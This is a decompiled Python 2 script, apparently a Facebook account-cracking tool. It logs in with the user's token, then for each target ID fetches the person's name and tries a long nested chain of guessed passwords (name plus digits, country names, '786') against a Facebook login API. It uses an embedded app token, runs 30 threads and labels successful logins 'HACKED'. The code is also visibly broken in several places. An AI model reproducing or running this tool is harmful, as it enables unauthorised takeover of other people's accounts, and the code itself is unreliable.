# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, mechanize, requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 Khan.py')

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exit():
    print '[!] Exit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def hamza(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


banner = "\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;91mRishu Khan\n \x1b[92m FACEBOOK\x1b[00m: \033[1;91mhttps://www.facebook.com/Rishu.X.420\n \x1b[92m WhatsApp\x1b[00m : \033[1;91mNa Duga\n\x1b[00m------------------------------------------"

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r[\xe2\x9c\x94] Logging In ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
id = []

def tlogin():
    os.system('clear')
    print banner
    username = raw_input('[\xf0\x9f\x94\x90] \x1b[1;94mTOOL USERNAME: ')
    if username == 'Rishu':
        os.system('clear')
        print banner
        print '[\xe2\x9c\x93]  \x1b[1;91mTOOL USERNAME: ' + username + ' (correct)'
    else:
        print '[!] Invalid Username.'
        time.sleep(1)
        tlogin()
    passw = raw_input('[\xf0\x9f\x94\x90]  \x1b[1;94mTOOL PASSWORD: ')
    if passw == 'Khan':
        os.system('clear')
        print banner
        print '[\xe2\x9c\x93]  \x1b[1;91mTOOL USERNAME: ' + username + ' (correct)'
        print '[\xe2\x9c\x93]  \x1b[1;91mTOOL PASSWORD: ' + passw + '  (correct)'
        time.sleep(2)
    else:
        print '[!] Invalid Password.'
        time.sleep(1)
        tlogin()
    try:
        toket = open('login.txt', 'r')
        os.system('python2 Khan-d.py')
    except (KeyError, IOError):
        methodlogin()
    else:
        print '[!] Invalid Password'
        time.sleep(1)
        tlogin()


def methodlogin():
    os.system('clear')
    print banner
    print '[1] \x1b[1;93m Login With ID/Email/Password.'
    print '[2]  \x1b[1;93mLogin Using Token.'
    print '[3]  \x1b[1;93mExit.'
    print '      '
    hos = raw_input('\n \x1b[1;92mChoose Option >>  ')
    if hos == '':
        print '[!]  Wrong Input'
        exit()
    elif hos == '1':
        login()
    elif hos == '2':
        os.system('clear')
        print banner
        hosp = raw_input('[\xf0\x9f\x94\x91]  \x1b[1;91mGive Token : ')
        tik()
        hopa = open('login.txt', 'w')
        hopa.write(hosp)
        hopa.close()
        print '\n[\xe2\x9c\x93]  \x1b[1;91mLogged In Successfully.'
        time.sleep(1)
        os.system('xdg-open https://www.facebook.com/Rishu.X.420')
        os.system('python2 Khan-d.py')
    elif hos == '0':
        exit()
    else:
        print '[!] \x1b[1;91mWrong Input'
        exit()


def login():
    os.system('clear')
    try:
        tb = open('login.txt', 'r')
        os.system('python2 Khan-d.py')
    except (KeyError, IOError):
        os.system('clear')
        print banner
        hamza('[\xf0\x9f\x94\x90] \x1b[1;96mLogin Your Facebook Account')
        hamza('[\xf0\x9f\x94\x90] \x1b[1;96mDonot Use Your Personal Account')
        hamza('[\xf0\x9f\x94\x90] \x1b[1;96mUse a New Facebook Account To Login')
        print '-------------------------------------'
        iid = raw_input('[+] Number/Email: ')
        id = iid.replace(' ', '')
        pwd = raw_input('[+] Password : ')
        tik()
        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + id + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        z = json.load(data)
        if 'access_token' in z:
            st = open('login.txt', 'w')
            st.write(z['access_token'])
            st.close()
            print '\n[\xe2\x9c\x93] \x1b[1;91mLogged In Successfully.'
            time.sleep(1)
            os.system('xdg-open https://www.facebook.com/Rishu.X.420')
            os.system('clear')
            os.system('python2 Khan-d.py')
        elif 'www.facebook.com' in z['error_msg']:
            print '[!] \x1b[1;91mUser Must Verify Account Before Login.'
            time.sleep(3)
            login()
        else:
            print '[!]\x1b[1;91mNumber/User Id/ Password Is Wrong !'
            time.sleep(1)
            login()

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[92mHACKED]' + user + '<=>' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass1
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[92m[HACKED]' + user + '<=>' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass2
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[92m[HACKED]' + user + '<=>' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass3
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = b['first_name'] + '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        if 'access_token' in q:
                            print '\x1b[92m[HACKED]' + user + '<=>' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass4
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[92m[HACKED]' + user + '<=>' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass5
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['last_name'] + '1234'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[92m[HACKED]' + user + '<=>' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass6
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = b['last_name'] + '12345'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[92m[HACKED]' + user + '<=>' + pass7
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass7
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = b['last_name'] + '123456'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[92m[HACKED]' + user + '<=>' + pass8
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass8
                                            cekpoint.append(user + pass8)
                                        else:
                                            pass9 = 'Kontol'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[92m[HACKED]' + user + '<=>' + pass9
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass9
                                                cekpoint.append(user + pass9)
                                            else:
                                                pass10 = 'Kontol123'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[92m[HACKED]' + user + '<=>' + pass10
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass10
                                                    cekpoint.append(user + pass10)
                                                else:
                                                    pass12 = '786786'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[92m[HACKED]' + user + '<=>' + pass12
                                                        oks.append(user + pass12)
                                                    elif 'www.facebook.com' in q['error_msg']:
                                                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass12
                                                        cekpoint.append(user + pass12)
                                                    else:
                                                        pass13 = b['first_name'] + '786'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
                                                            print '\x1b[92m[HACKED]' + user + '<=>' + pass13
                                                            oks.append(user + pass13)
                                                        elif 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass13
                                                            cekpoint.append(user + pass13)
                                                        else:
                                                            pass14 = b['last_name'] + '786'
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[92m[HACKED]' + user + '<=>' + pass14
                                                                oks.append(user + pass14)
                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass14
                                                                cekpoint.append(user + pass14)
                                                            else:
                                                                pass15 = 'Bangladesh'
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                q = json.load(data)
                                                                if 'access_token' in q:
                                                                    print '\x1b[92m[HACKED]' + user + '<=>' + pass15
                                                                    oks.append(user + pass15)
                                                                elif 'www.facebook.com' in q['error_msg']:
                                                                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass15
                                                                    cekpoint.append(user + pass15)
                                                                else:
                                                                    pass16 = 'Bangladesh123'
                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print '\x1b[92m[HACKED]' + user + '<=>' + pass16
                                                                        oks.append(user + pass16)
                                                                    elif 'www.facebook.com' in q['error_msg']:
                                                                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass16
                                                                        cekpoint.append(user + pass16)
                                                                    else:
                                                                        pass17 = 'Pakistan'
                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass17 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        q = json.load(data)
                                                                        if 'access_token' in q:
                                                                            print '\x1b[92m[HACKED]' + user + '<=>' + pass17
                                                                            oks.append(user + pass17)
                                                                        elif 'www.facebook.com' in q['error_msg']:
                                                                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass17
                                                                            cekpoint.append(user + pass17)
                                                                        else:
                                                                            pass18 = 'Pakistan123'
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print '\x1b[92m[HACKED]' + user + '<=>' + pass18
                                                                                oks.append(user + pass18)
                                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass18
                                                                                cekpoint.append(user + pass18)
                                                                            else:
                                                                                pass19 = 'Bangsat'
                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass19 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                q = json.load(data)
                                                                                if 'access_token' in q:
                                                                                    print '\x1b[92m[HACKED]' + user + '<=>' + pass19
                                                                                    oks.append(user + pass19)
                                                                                elif 'www.facebook.com' in q['error_msg']:
                                                                                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass19
                                                                                    cekpoint.append(user + pass19)
                                                                                else:
                                                                                    pass20 = 'Bangsat123'
                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                    q = json.load(data)
                                                                                    if 'access_token' in q:
                                                                                        print '\x1b[92m[HACKED]' + user + '<=>' + pass20
                                                                                        oks.append(user + pass20)
                                                                                    elif 'www.facebook.com' in q['error_msg']:
                                                                                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass20
                                                                                        cekpoint.append(user + pass20)
                                                                                    else:
                                                                                        pass21 = 'Anjing'
                                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass21 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                        q = json.load(data)
                                                                                        if 'access_token' in q:
                                                                                            print '\x1b[92m[HACKED]' + user + '<=>' + pass21
                                                                                            oks.append(user + pass21)
                                                                                        elif 'www.facebook.com' in q['error_msg']:
                                                                                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass21
                                                                                            cekpoint.append(user + pass21)
                                                                                        else:
                                                                                            pass22 = 'Anjing123'
                                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass22 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                            q = json.load(data)
                                                                                            if 'access_token' in q:
                                                                                                print '\x1b[92m[HACKED]' + user + '<=>' + pass22
                                                                                                oks.append(user + pass22)
                                                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                                                print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass22
                                                                                                cekpoint.append(user + pass22)
                                                                                            else:
                                                                                                pass23 = 'Sayang'
                                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass23 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                q = json.load(data)
                                                                                                if 'access_token' in q:
                                                                                                    print '\x1b[92m[HACKED]' + user + '<=>' + pass23
                                                                                                    oks.append(user + pass23)
                                                                                                elif 'www.facebook.com' in q['error_msg']:
                                                                                                    print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass23
                                                                                                    cekpoint.append(user + pass23)
                                                                                                else:
                                                                                                    pass24 = 'Sayang123'
                                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass24 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                    q = json.load(data)
                                                                                                    if 'access_token' in q:
                                                                                                        print '\x1b[92m[HACKED]' + user + '<=>' + pass24
                                                                                                        oks.append(user + pass24)
                                                                                                    elif 'www.facebook.com' in q['error_msg']:
                                                                                                        print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass24
                                                                                                        cekpoint.append(user + pass24)
                                                                                                    else:
                                                                                                        b = json.load(a.txt)
                                                                                                        pass25 = 'Indonesia'
                                                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass25 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                        q = json.load(data)
                                                                                                        if 'access_token' in q:
                                                                                                            print '\x1b[92m[HACKED]' + user + '<=>' + pass25
                                                                                                            oks.append(user + pass25)
                                                                                                        elif 'www.facebook.com' in q['error_msg']:
                                                                                                            print '\x1b[91m[CHECKPOINT]' + user + '<=>' + pass25
                                                                                                            cekpoint.append(user + pass25)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[00m[\x1b[00m\xe2\x9c\x93\x1b[00m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[00m[+] \x1b[1;92mTotal OK/\x1b[91mCP \x1b[93m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[91m' + str(len(cekpoint))
    raw_input('\n\x1b[00m[\x1b[92mKembali\x1b[00m]')
    super()


if __name__ == '__main__':
    tlogin() 
